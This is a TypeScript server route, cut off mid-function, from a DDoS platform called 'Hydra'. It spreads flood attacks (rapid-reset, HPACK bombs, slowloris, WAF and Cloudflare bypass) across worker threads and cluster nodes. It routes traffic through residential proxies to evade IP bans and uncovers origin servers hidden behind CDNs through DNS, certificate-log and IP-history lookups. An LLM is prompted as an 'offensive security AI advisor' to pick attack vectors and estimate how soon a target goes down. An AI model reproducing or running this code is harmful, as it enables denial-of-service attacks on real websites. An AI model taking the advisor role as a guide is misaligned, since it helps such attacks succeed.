/**
 * ATTACKS ROUTE
 *
 * Orchestrates attacks using worker_threads — one worker per CPU core.
 * Each worker runs its own Node.js event loop, dgram UDP sockets, net TCP
 * sockets, and fetch HTTP calls in complete isolation.
 *
 * With 8 CPU cores:
 *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
 *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
 *   • Hydra Ovrd → 8 × triple vector = massive concurrent load
 */
import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import { attackLimiter } from "../middlewares/rateLimit.js";
import { Worker } from "worker_threads";
import os   from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import dnsP from "node:dns/promises";
import https from "node:https";
import http  from "node:http";
import net   from "node:net";
import { execFile } from "node:child_process";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";
import { proxyCache, healthyProxyCache, fastProxyCache, slowProxyCache, getResidentialCreds } from "./proxies.js";
import { CLUSTER_NODES } from "./cluster.js";

// ── Cluster node health cache — refreshed every 60 s ─────────────────────────
// Prevents sending attacks to nodes that are offline/overloaded.
// Structure: nodeUrl → { online, checkedAt }
interface NodeHealth { online: boolean; checkedAt: number }
const nodeHealthCache = new Map<string, NodeHealth>();
const HEALTH_TTL_MS   = 60_000; // 60-second health cache

// Smart method pool — each peer node gets a different vector to avoid
// all cluster nodes hitting the same rate-limit or WAF rule simultaneously.
// Self (node 0) always runs whatever method was requested.
const SMART_PEER_METHODS = [
  "rapid-reset",        // node 1: HTTP/2 RST flood (CVE-2023-44487)
  "waf-bypass",         // node 2: JA3 + Chrome H2 fingerprint bypass
  "h2-rst-burst",       // node 3: H2 RST burst (rapid-reset variant)
  "tls-session-exhaust",// node 4: TLS session cache saturation
  "bypass-storm",       // node 5: 3-phase composite layer bypass
  "http-flood",         // node 6: high-concurrency HTTP flood
  "hpack-bomb",         // node 7: H2 HPACK table OOM
  "conn-flood",         // node 8: TCP connection table exhaustion
  "geass-ultima",       // node 9+: final form (all 9 vectors)
];

// Check a single node's health (non-blocking — result cached)
async function refreshNodeHealth(nodeUrl: string): Promise<boolean> {
  try {
    const r = await fetch(`${nodeUrl.replace(/\/$/, "")}/api/healthz`, {
      signal: AbortSignal.timeout(3000),
    });
    const online = r.ok;
    nodeHealthCache.set(nodeUrl, { online, checkedAt: Date.now() });
    return online;
  } catch {
    nodeHealthCache.set(nodeUrl, { online: false, checkedAt: Date.now() });
    return false;
  }
}

// ── Cluster fan-out — health-aware, smart-method-per-node (fire & forget) ────
// Each peer node receives a different attack vector to:
//   1. Bypass per-method WAF rules (different signatures per node)
//   2. Exploit CDN rate-limit pools across multiple vectors simultaneously
//   3. Avoid all nodes hitting the same resource pool on the target
function fanOutToCluster(target: string, port: number, method: string, duration: number, threads: number): void {
  if (CLUSTER_NODES.length === 0) return;

  CLUSTER_NODES.forEach((nodeUrl, idx) => {
    const cached   = nodeHealthCache.get(nodeUrl);
    const now      = Date.now();
    const isStale  = !cached || now - cached.checkedAt > HEALTH_TTL_MS;
    const isOnline = cached?.online ?? true; // optimistic if never checked

    // Skip nodes known to be offline (stale cache means re-check before deciding)
    if (!isStale && !isOnline) {
      // Node was recently checked and is offline — skip silently
      return;
    }

    // Assign a distinct vector per peer node (index 0 = first peer, not self)
    const peerMethod = SMART_PEER_METHODS[idx % SMART_PEER_METHODS.length] ?? method;

    const doSend = () => {
      void fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks?peer=1`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ target, port, method: peerMethod, duration, threads }),
        signal:  AbortSignal.timeout(8000),
      }).catch(() => {
        // Mark node as offline on connection failure
        nodeHealthCache.set(nodeUrl, { online: false, checkedAt: Date.now() });
      });
    };

    if (isStale) {
      // Re-check health, then send only if online
      void refreshNodeHealth(nodeUrl).then(online => {
        if (online) doSend();
      });
    } else {
      // Cache is fresh and node is online — send immediately
      doSend();
    }
  });
}

const router: IRouter = Router();

// ── Worker file path (resolved relative to this bundle) ───────────────────
const WORKER_FILE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "attack-worker.mjs",
);

// ── Live in-memory connection counter (slowloris + conn-flood) ─────────────
export const attackLiveConns = new Map<number, number>();

// ── Attack end-time tracking — used to correctly compute remaining time on Extend ──
// Stores absolute epoch-ms when each attack is scheduled to stop.
const attackEndTimes = new Map<number, number>();

// ── In-memory live stats (no DB latency) ───────────────────────────────────
// Accumulated since attack start — never reset until attack ends
const livePackets   = new Map<number, number>(); // total packets in memory
const liveBytes     = new Map<number, number>(); // total bytes in memory
// Snapshot from last rate window (updated every 1s by the rate timer)
const livePps       = new Map<number, number>(); // current pps
const liveBps       = new Map<number, number>(); // current bps
// Previous snapshot for delta calculation
const prevPktsSnap  = new Map<number, number>();
const prevBytesSnap = new Map<number, number>();
// Ring buffer of last 120 samples per attack (2 min @ 1s tick): { t, pps, bps, conns }
interface TimeseriesSample { t: number; pps: number; bps: number; conns: number }
const liveTimeseries = new Map<number, TimeseriesSample[]>();
const TIMESERIES_MAX = 120;

// T003: Response code telemetry — accumulated from worker "codes" messages
interface LiveCodes { ok: number; redir: number; client: number; server: number; timeout: number }
const liveResponseCodes = new Map<number, LiveCodes>();  // per attack-id
const liveLatAvgMs      = new Map<number, number>();     // running avg latency per attack

// ── Live probe results — auto-probe target via residential proxy every 15s ──
// Gives real latency + HTTP status from a clean residential IP during the attack.
// Unlike direct curl (which gets blocked), residential proxy bypasses WAF IP bans.
interface ProbeResult {
  t: number;           // unix timestamp
  up: boolean;         // site is responding
  statusCode: number | null;
  latencyMs: number;
  serverHeader: string | null;
  via: string;         // "residential" | "direct"
}
const liveProbeResult  = new Map<number, ProbeResult>();    // latest probe per attack
const liveProbeHistory = new Map<number, ProbeResult[]>();  // last 20 probes per attack
const liveOriginIP     = new Map<number, string>();         // found origin IP per attack

// Internal probe function — curl via residential proxy to measure real impact
// Uses %{time_total} (from curl) to get actual latency, not TCP RTT estimate
async function _attackProbe(targetUrl: string): Promise<ProbeResult> {
  const t0 = Date.now();
  const rc  = getResidentialCreds();
  const proxyArg: string[] = rc
    ? ["-x", `http://${rc.username}:${rc.password}@${rc.host}:${rc.port}`]
    : [];
  const args = [
    "-s", "--max-time", "12",
    "-o", "/dev/null",
    "-w", "%{http_code}\\n%{time_total}\\n%header{server}",
    "--ssl-no-revoke", "--insecure",
    ...proxyArg,
    targetUrl,
  ];
  return new Promise(resolve => {
    execFile("curl", args, { timeout: 14_000 }, (err, stdout) => {
      const latencyMs = Date.now() - t0;
      const via       = rc ? "residential" : "direct";
      if (err || !stdout.trim()) {
        resolve({ t: Date.now(), up: false, statusCode: null, latencyMs, serverHeader: null, via });
        return;
      }
      const lines      = stdout.trim().split("\n");
      const statusCode = parseInt(lines[0] ?? "0", 10) || null;
      const curlMs     = parseFloat(lines[1] ?? "0") * 1000;
      const serverHdr  = lines[2]?.trim() || null;
      const latency    = curlMs > 0 ? Math.round(curlMs) : latencyMs;
      const up         = !!statusCode && statusCode > 0 && statusCode < 500 && statusCode !== 503;
      resolve({ t: Date.now(), up, statusCode, latencyMs: latency, serverHeader: serverHdr, via });
    });
  });
}

// ── DB write batcher — accumulate deltas, flush every 500ms ────────────────
// Prevents ~140 concurrent DB writes/s during Hydra Override (21+ vectors × 300ms flush)
const dbBatchPkts  = new Map<number, number>();
const dbBatchBytes = new Map<number, number>();

setInterval(async () => {
  if (dbBatchPkts.size === 0) return;
  // Atomic swap: grab BOTH maps' contents in one pass then clear both —
  // prevents the race where a worker message lands between the two .clear() calls
  // and its stats are counted in pkts but not bytes (or vice versa).
  const snapshot: [number, number, number][] = [];
  for (const [id, pkts] of dbBatchPkts) {
    snapshot.push([id, pkts, dbBatchBytes.get(id) ?? 0]);
  }
  dbBatchPkts.clear();
  dbBatchBytes.clear();
  for (const [id, pkts, bytes] of snapshot) {
    addStats(id, pkts, bytes).catch(err =>
      console.warn(`[DB-BATCHER] addStats failed for attack ${id}:`, err instanceof Error ? err.message : err)
    );
  }
}, 500);

// Rate calculator — updates pps/bps from in-memory totals every second
setInterval(() => {
  for (const [id, total] of livePackets.entries()) {
    const prev  = prevPktsSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevPktsSnap.set(id, total);
    livePps.set(id, delta);
  }
  for (const [id, total] of liveBytes.entries()) {
    const prev  = prevBytesSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevBytesSnap.set(id, total);
    liveBps.set(id, delta);
  }
  // Push timeseries sample for every running attack
  const now = Date.now();
  for (const id of attackAborts.keys()) {
    let series = liveTimeseries.get(id);
    if (!series) { series = []; liveTimeseries.set(id, series); }
    series.push({
      t:     now,
      pps:   livePps.get(id) ?? 0,
      bps:   liveBps.get(id) ?? 0,
      conns: attackLiveConns.get(id) ?? 0,
    });
    if (series.length > TIMESERIES_MAX) series.shift();
  }
}, 1000);

// ── CPU count (how many parallel workers to spawn) ────────────────────────
const CPU_COUNT = Math.max(1, os.cpus().length);

// ── OOM Guard — cap workers per pool to prevent container OOM kill ─────────
// DETECTION: REPLIT_DEPLOYMENT is set ONLY in deployed (production) containers.
// Deployed (production): 8 vCPU / 32GB RAM dedicated container.
// Dev (workspace):       shared container, ~2-4GB available.
// Each Node.js worker thread loads the full attack-worker bundle (~8.9MB compiled)
// and uses ~100-200MB RAM at runtime (I/O-bound, rarely hits heap ceiling).
// With 512MB heap cap: 64 workers × 512MB = 32GB theoretical; actual ~6-13GB.
// Without a cap: geass-ultima's old formula created 264 worker requests → OOM kill
// → process dies → ALL attacks fail until restart.
const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);

// Max workers per pool:
//   Deployed (8 vCPU / 32GB): 8 workers per pool = 1 per vCPU (saturates all cores).
//   Dev (shared container):   3 workers (safe on ~2GB shared).
const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 8 : 3;

// Dev threads per worker: 256 — stays within safe socket-buffer RAM.
const DEV_MAX_THREADS = 256;

// Global total worker cap — applies in BOTH dev and prod.
// Prod: 64 workers × 512MB heap cap = 32GB theoretical; actual ~100-200MB each (I/O-bound)
//       → ~6.4-12.8GB actual RAM. Safe on 32GB with 8vCPU Replit deployment.
// Dev:  48 workers (same as before).
let _activeWorkers = 0;
const MAX_TOTAL_WORKERS = IS_DEPLOYED ? 64 : 48;

// ── Thread Multiplier — "Power Level" UX ──────────────────────────────────
// The UI accepts threads 1–8 (power level). Internally we multiply by this
// factor to reach full connection concurrency.
// threads=8 → 8 × 500 = 4000 concurrent connections per worker (prod).
//   Rapid-reset: 4000 × MAX_INFLIGHT_FACTOR(100) = 80K in-flight/worker (capped).
//   H2 multiplex: 4000 × 8 streams = 32K → capped at 4000 streams/session.
//   geass-ultima rrT: max(800, 4000×0.55=2200) = 2200 — beats old preset of 3000→1650.
//   Pipeline: 4000 conn × 512 reqs/write = 2M reqs per write batch.
// Cap: 12000 in prod (leaves RAM headroom), 256 dev (container safe).
// Dev: smaller multiplier to stay within shared container limits.
const THREAD_MULTIPLIER = IS_DEPLOYED ? 500 : 32;

// ── Webhook ────────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
  try {
    const payload = {
      event,
      attack,
      timestamp: new Date().toISOString(),
      embeds: [{
        title: event === "target_down" ? "🔴 TARGET DOWN — HYDRA" : "✅ ATTACK FINISHED — HYDRA",
        description: event === "target_down"
          ? `Target **${attack.target}** confirmed OFFLINE`
          : `Attack against **${attack.target}** has completed`,
        color: event === "target_down" ? 0xFF0000 : 0x00FF41,
        fields: [
          { name: "Target",       value: attack.target,              inline: true },
          { name: "Method",       value: attack.method,              inline: true },
          { name: "Duration",     value: `${attack.duration}s`,      inline: true },
          { name: "Packets Sent", value: String(attack.packetsSent), inline: true },
          { name: "Bytes Sent",   value: String(attack.bytesSent),   inline: true },
          { name: "Status",       value: attack.status,              inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Hydra — ARES OMNIVECT ∞" },
      }],
    };
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(5000),
    });
  } catch (err) {
    console.warn(`[WEBHOOK] Failed to fire webhook to ${url}:`, err instanceof Error ? err.message : err);
  }
}

// ── Kill webhook: fire when target confirmed down (called from panel /api/notify) ──
// ── Scheduled attacks — in-memory queue with 10s polling ──────────────────
interface ScheduledAttack {
  id: string; target: string; port: number; method: string;
  duration: number; threads: number; webhookUrl?: string;
  scheduledFor: number; createdAt: number;
}
const scheduledAttacks = new Map<string, ScheduledAttack>();

// Poll every 10s — fire scheduled attacks that are due
setInterval(async () => {
  const now = Date.now();
  for (const [sid, sa] of scheduledAttacks.entries()) {
    if (now >= sa.scheduledFor) {
      scheduledAttacks.delete(sid);
      try {
        await fetch(`http://127.0.0.1:${process.env.PORT ?? 8080}/api/attacks`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            target: sa.target, port: sa.port, method: sa.method,
            duration: sa.duration, threads: sa.threads, webhookUrl: sa.webhookUrl,
          }),
          signal: AbortSignal.timeout(8000),
        });
      } catch { /* ignore — server may be starting */ }
    }
  }
}, 10_000);

// ── AI Advisor — live Groq-powered tactical analysis ──────────────────────
const GROQ_SYSTEM = `You are an elite offensive security AI advisor for a penetration testing platform called "Hydra". Analyze live attack metrics and return ONLY a valid JSON object. No markdown, no explanation, no code fences.`;

/** Safely parse Groq response — strips markdown fences and finds first JSON block */
function parseGroqJSON(raw: string): Record<string, unknown> {
  // Strip markdown code fences (```json ... ```)
  let s = raw.replace(/^```(?:json)?\s*/im, "").replace(/\s*```\s*$/im, "").trim();
  // Find first complete { ... } block in case of leading/trailing text
  const a = s.indexOf("{"); const b = s.lastIndexOf("}");
  if (a !== -1 && b !== -1 && b > a) s = s.slice(a, b + 1);
  try { return JSON.parse(s); }
  catch { return { analysis: raw.length > 0 ? raw : "No analysis available." }; }
}
async function groqAdvisor(attack: typeof attacksTable.$inferSelect, pps: number, bps: number, conns: number, targetStatus: string, targetLatencyMs: number): Promise<Record<string, unknown>> {
  const apiKey = process.env.GROQ_API_KEY;
  if (!apiKey) return { error: "GROQ_API_KEY not set" };
  const msg = `LIVE METRICS — Target:${attack.target} Method:${attack.method} PPS:${pps} BPS:${bps} Conns:${conns} HTTP:${targetStatus} Latency:${targetLatencyMs}ms

Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read, h2-dep-bomb, h2-data-flood, h2-storm, bypass-storm, h2-rst-burst, grpc-flood

Respond with JSON: {"analysis":"brief tactical assessment","primaryRecommendation":"specific next action","boostVector":"method_name","reduceVector":"method_name or null","severity":"low|medium|high|critical","estimatedDownIn":"time estimate or null","tip":"one advanced tip","effectiveness":0-100}`;
  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
    body: JSON.stringify({
      model: "llama-3.3-70b-versatile",
      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
      max_tokens: 400, temperature: 0.2,
      response_format: { type: "json_object" },
    }),
    signal: AbortSignal.timeout(15_000),
  });
  const data = await resp.json() as { choices?: [{ message?: { content?: string } }]; error?: { message?: string } };
  if (data.error) throw new Error(data.error.message ?? "Groq API error");
  return parseGroqJSON(data?.choices?.[0]?.message?.content ?? "{}");
}

// ── Standalone AI Advisor (no attack required) — probe + analyse ──────────
async function groqAdvisorTarget(target: string): Promise<Record<string, unknown>> {
  const apiKey = process.env.GROQ_API_KEY;
  if (!apiKey) return { error: "GROQ_API_KEY not set" };
  // Quick probe
  let targetStatus = "unknown"; let targetLatencyMs = 0;
  try {
    const t0 = Date.now();
    const url = target.startsWith("http") ? target : `https://${target}/`;
    const pr = await fetch(url, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
  } catch { targetStatus = "offline"; }
  const msg = `PRE-ATTACK RECON — Target:${target} HTTP:${targetStatus} Latency:${targetLatencyMs}ms
Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read, h2-dep-bomb, h2-data-flood, h2-storm, bypass-storm, h2-rst-burst, grpc-flood
Respond with JSON: {"analysis":"brief target assessment","primaryRecommendation":"best starting vector","boostVector":"method_name","severity":"low|medium|high|critical","estimatedDownIn":"rough estimate","tip":"one advanced tip","effectiveness":0-100,"targetStatus":"${targetStatus}","latencyMs":${targetLatencyMs}}`;
  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
    body: JSON.stringify({
      model: "llama-3.3-70b-versatile",
      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
      max_tokens: 400, temperature: 0.2,
      response_format: { type: "json_object" },
    }),
    signal: AbortSignal.timeout(15_000),
  });
  const data = await resp.json() as { choices?: [{ message?: { content?: string } }]; error?: { message?: string } };
  if (data.error) throw new Error(data.error.message ?? "Groq API error");
  return parseGroqJSON(data?.choices?.[0]?.message?.content ?? "{}");
}

// GET /api/advisor?target=<url>  — standalone AI advisory (no active attack needed)
router.get("/advisor", async (req, res): Promise<void> => {
  const target = String(req.query.target ?? "").trim();
  if (!target) { res.status(400).json({ error: "target query param required" }); return; }
  try {
    const advice = await groqAdvisorTarget(target);
    res.json(advice);
  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
});

// ── DB stats accumulator — throws on error so callers can log it ─────────
async function addStats(id: number, pkts: number, bytes: number): Promise<void> {
  await db.update(attacksTable).set({
    packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
    bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
  }).where(eq(attacksTable.id, id));
}

// ── Worker stats handler: update in-memory live stats + batch for DB ───────
function onWorkerStats(id: number, pkts: number, bytes: number, conns?: number) {
  // In-memory totals — instant, no DB lag
  livePackets.set(id, (livePackets.get(id) ?? 0) + pkts);
  liveBytes.set(id,   (liveBytes.get(id)   ?? 0) + bytes);
  // Queue for batched DB write (flushed every 500ms)
  dbBatchPkts.set(id,  (dbBatchPkts.get(id)  ?? 0) + pkts);
  dbBatchBytes.set(id, (dbBatchBytes.get(id) ?? 0) + bytes);
  // Live connection counter
  if (conns !== undefined) attackLiveConns.set(id, conns);
}

// T003: Global code dispatcher registry — keyed by AbortSignal so all pools
// in a geass-override fanout report to the correct attack without param threading.
const _codeDispatchers = new Map<AbortSignal, (codes: LiveCodes, latMs: number) => void>();

// T003: Response code accumulator — called from spawnPool on code messages
function onWorkerCodes(id: number, codes: LiveCodes, latAvgMs: number): void {
  const cur = liveResponseCodes.get(id) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
  cur.ok      += codes.ok;
  cur.redir   += codes.redir;
  cur.client  += codes.client;
  cur.server  += codes.server;
  cur.timeout += codes.timeout;
  liveResponseCodes.set(id, cur);
  // Exponential moving average for latency
  if (latAvgMs > 0) {
    const prev = liveLatAvgMs.get(id) ?? latAvgMs;
    liveLatAvgMs.set(id, Math.round(prev * 0.7 + latAvgMs * 0.3));
  }
}


// ─────────────────────────────────────────────────────────────────────────
//  SPAWN POOL — spawns numWorkers workers for a single method
// ─────────────────────────────────────────────────────────────────────────
const HTTP_PROXY_METHODS = new Set([
  // L7 HTTP methods — full proxy rotation (HTTP + SOCKS5)
  "http-flood", "http-bypass", "http-pipeline",
  // L7 application-layer attacks — proxy-aware
  "graphql-dos", "cache-poison", "rudy-v2",
  // TLS/H2 methods — HTTP CONNECT + SOCKS5 tunnel
  "http2-flood", "http2-continuation", "hpack-bomb", "ssl-death", "tls-renego",
  "conn-flood", "ws-flood", "h2-settings-storm", "waf-bypass",
  // New ARES OMNIVECT ∞ vectors — all L7, benefit from IP rotation
  "slow-read", "range-flood", "xml-bomb", "h2-ping-storm",
  "http-smuggling", "doh-flood", "keepalive-exhaust",
  "app-smart-flood", "large-header-bomb", "http2-priority-storm",
  // Hydra vectors — must rotate via proxy to bypass Cloudflare IP filtering
  "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst", "grpc-flood",
  "h2-storm", "pipeline-flood", "conn-flood", "slowloris",
  // Composite bypass
  "bypass-storm",
  // New vectors — benefit from IP rotation
  "tls-session-exhaust", "cache-buster",
  // New H2 vector methods (2025)
  "h2-dep-bomb", "h2-data-flood",
  // True H2 multiplexing mode (2026) — persistent streams, zero RST
  "h2-multiplex",
  // New methods (2026)
  "rapid-reset", "ws-compression-bomb", "h2-goaway-loop", "sse-exhaust",
  // Final form — all vectors + proxy rotation
  "geass-ultima", "geass-absolutum",
  // CDN bypass — needs proxy rotation for both origin and CDN attacks
  "origin-bypass",
  // CDN cache invalidation — purge requests via proxy to force origin hit on every req
  "cdn-purge-flood",
  // CDN pool exhaustion — slow POST through CDN to exhaust origin connection pool via residential IPs
  "cdn-slow-exhaust",
]);

// Methods that hold connections open — slow proxies are acceptable (latency doesn't matter)
// Using slow proxies here frees up fast proxies for latency-sensitive vectors
const SLOW_PROXY_METHODS = new Set([
  "slowloris", "rudy-v2", "slow-read", "sse-exhaust", "keepalive-exhaust",
  "cdn-purge-flood", "ws-flood", "conn-flood", "cdn-slow-exhaust",
]);

// ── Cloudflare IP range check (for origin-bypass auto-discovery) ──────────
const _CF_RANGES_OB = [
  "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
  "141.101.64.0/18","108.162.192.0/18","190.93.240.0/20","188.114.96.0/20",
  "197.234.240.0/22","198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
  "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
].map(cidr => {
  const [ip, mask] = cidr.split("/");
  const p = ip.split(".").map(Number);
  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
  const m = mask === "0" ? 0 : (~((1 << (32 - Number(mask))) - 1)) >>> 0;
  return [n, m, (n & m) >>> 0] as [number, number, number];
});

function _isCFIP(ip: string): boolean {
  const p = ip.split(".").map(Number);
  if (p.length !== 4 || p.some(x => isNaN(x))) return false;
  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
  return _CF_RANGES_OB.some(([, m, net]) => (n & m) === net);
}

// Probe a candidate IP to confirm it's the real origin (not a CDN edge)
// Returns true if the IP looks like an origin server (no CDN server header)
async function _isRealOrigin(ip: string, hostname: string): Promise<boolean> {
  const CDN_SIGNATURES = ["gocache","cloudflare","akamai","fastly","sucuri","incapsula",
    "varnish","nginx-cdn","edgesuite","edgekey","llnwd","edgecastcdn","imperva","radware",
    "arbor","f5","barracuda","reblaze","stackpath","bunnycdn","keycdn","cdn77","cdnify"];

  // Try both port 443 and port 80 — many origins respond on HTTP even if site uses HTTPS
  const tryPort = (port: number, useHttps: boolean): Promise<boolean> => new Promise(resolve => {
    const opts = useHttps
      ? { host: ip, path: "/", port, rejectUnauthorized: false, timeout: 6000,
          headers: { "Host": hostname, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html" } }
      : { host: ip, path: "/", port, timeout: 6000 };

    const doReq = (mod: typeof https | typeof http) => {
      const req = mod.request({
        ...opts,
        headers: { "Host": hostname, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html" },
      }, res => {
        const srv   = String(res.headers["server"]       ?? "").toLowerCase();
        const via   = String(res.headers["via"]           ?? "").toLowerCase();
        const xPow  = String(res.headers["x-powered-by"] ?? "").toLowerCase();
        const isCDN = CDN_SIGNATURES.some(s => srv.includes(s) || via.includes(s));
        // Accept if: not CDN, or server header looks like a real app server
        const isApp = /nginx|apache|litespeed|iis|gunicorn|uvicorn|php|wordpress|joomla|drupal/i.test(srv + xPow);
        resolve(!isCDN || isApp);
      });
      req.on("error", () => resolve(false));
      req.on("timeout", () => { req.destroy(); resolve(false); });
      req.end();
    };

    if (useHttps) doReq(https);
    else doReq(http);
  });

  // Try HTTPS first (443), then HTTP (80) if no luck, then common alt ports
  const [ok443, ok80, ok8080, ok8000] = await Promise.all([
    tryPort(443, true),
    tryPort(80,  false),
    tryPort(8080, false),
    tryPort(8000, false),
  ]);
  return ok443 || ok80 || ok8080 || ok8000;
}

// Finds the real origin IP behind a CDN using DNS enumeration + SPF + IPv6
// All candidates are verified via HTTP probe — if server header shows CDN, skip it
async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promise<string | null> {
  const BYPASS_SUBS = [
    // Common origin reveals
    "direct", "origin", "backend", "server", "real", "naked", "vps", "host",
    "old", "legacy", "backup", "fallback", "live", "prod", "production",
    // Mail/communication (often same IP as web origin)
    "mail", "smtp", "pop", "pop3", "imap", "relay", "mx", "mx1", "mx2",
    "webmail", "email", "autodiscover", "autoconfig",
    // Dev/staging
    "dev", "develop", "development", "staging", "stage", "stg", "beta",
    "test", "teste", "testing", "demo", "sandbox", "preview", "homolog",
    "homologacao", "homologacão",
    // Admin/cPanel
    "cpanel", "whm", "plesk", "directadmin", "admin", "panel", "painel",
    "manage", "control", "dashboard", "portal", "backoffice",
    // Sub-sites
    "www2", "www3", "m", "mobile", "app", "apps", "api", "api2",
    "loja", "shop", "store", "ecommerce", "cart",
    "blog", "forum", "faq", "help", "support", "suporte",
    "intranet", "internal", "private", "priv",
    // Infrastructure
    "ftp", "sftp", "ssh", "vpn", "proxy", "gateway", "fw", "firewall",
    "ns1", "ns2", "ns3", "dns", "rdns",
    "static", "assets", "cdn", "media", "upload", "files", "img", "images",
    "video", "downloads", "dl", "content",
    // Common for Brazilian sites
    "loja", "vendas", "pedidos", "cadastro", "acesso",
    "painel", "central", "gerenciamento", "sistema",
  ];

  const seen = new Set<string>(cdnIPs);
  const mu   = new Set<string>(); // dedup in-flight

  // Collect ALL candidate IPs from ALL sources in parallel, then verify all at once
  const [subResults, ipv6Results, txtResults, mxResults, crtResults, htResults, viewDnsResults, rapidDnsResults] = await Promise.allSettled([
    // 1. Subdomains — all resolved simultaneously
    Promise.allSettled(BYPASS_SUBS.map(sub =>
      dnsP.resolve4(`${sub}.${hostname}`).catch(() => [] as string[])
    )),
    // 2. IPv6 AAAA
    dnsP.resolve6(hostname).catch(() => [] as string[]),
    // 3. SPF/TXT
    dnsP.resolveTxt(hostname).catch(() => [] as string[][]),
    // 4. MX
    dnsP.resolveMx(hostname).catch(() => [] as { exchange: string }[]),
    // 5. crt.sh — Certificate Transparency logs expose subdomains even for hidden origins
    //    Often catches old certs that reveal the real IP before the CDN was added
    (async () => {
      const baseDom = hostname.split(".").slice(-2).join(".");
      const ac = new AbortController();
      const timer = setTimeout(() => ac.abort(), 8_000);
      try {
        const r = await fetch(
          `https://crt.sh/?q=%25.${baseDom}&output=json`,
          { headers: { "User-Agent": "Mozilla/5.0", "Accept": "application/json" }, signal: ac.signal }
        );
        clearTimeout(timer);
        const j = await r.json() as { name_value: string }[];
        const subs = [...new Set(j.flatMap(e => e.name_value.split("\n").map(s => s.trim().replace(/^\*\./, ""))))];
        return subs.filter(s => s.endsWith(`.${baseDom}`) || s === baseDom);
      } catch { clearTimeout(timer); return [] as string[]; }
    })(),
    // 6. HackerTarget DNS lookup — free public API that resolves all known subdomains
    (async () => {
      const baseDom = hostname.split(".").slice(-2).join(".");
      const ac = new AbortController();
      const timer = setTimeout(() => ac.abort(), 8_000);
      try {
        const r = await fetch(
          `https://api.hackertarget.com/hostsearch/?q=${baseDom}`,
          { headers: { "User-Agent": "Mozilla/5.0" }, signal: ac.signal }
        );
        clearTimeout(timer);
        const text = await r.text();
        if (text.includes("error") || text.includes("API count")) return [] as string[];
        // Format: "subdomain,ip\n..." — extract IPs directly
        const ips: string[] = [];
        for (const line of text.trim().split("\n")) {
          const parts = line.split(",");
          if (parts.length === 2) {
            const ip = parts[1].trim();
            if (/^\d+\.\d+\.\d+\.\d+$/.test(ip)) ips.push(ip);
          }
        }
        return ips;
      } catch { clearTimeout(timer); return [] as string[]; }
    })(),
    // 7. ViewDNS IP History — historical A records before CDN was added
    //    Most valuable source: shows the REAL server IP before they hid behind CDN
    (async () => {
      const ac = new AbortController();
      const timer = setTimeout(() => ac.abort(), 10_000);
      try {
        const r = await fetch(
          `https://viewdns.info/iphistory/?domain=${hostname}`,
          { headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml" }, signal: ac.signal }
        );
        clearTimeout(timer);
        const html = await r.text();
        // Extract IPs from table cells — ViewDNS embeds IP history in <td> tags in a plain table
        const ips: string[] = [];
        for (const m of html.matchAll(/<td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})<\/td>/g)) {
          ips.push(m[1]);
        }
        if (ips.length > 0) console.log(`[origin-discovery] ViewDNS found ${ips.length} historical IPs for ${hostname}`);
        return [...new Set(ips)];
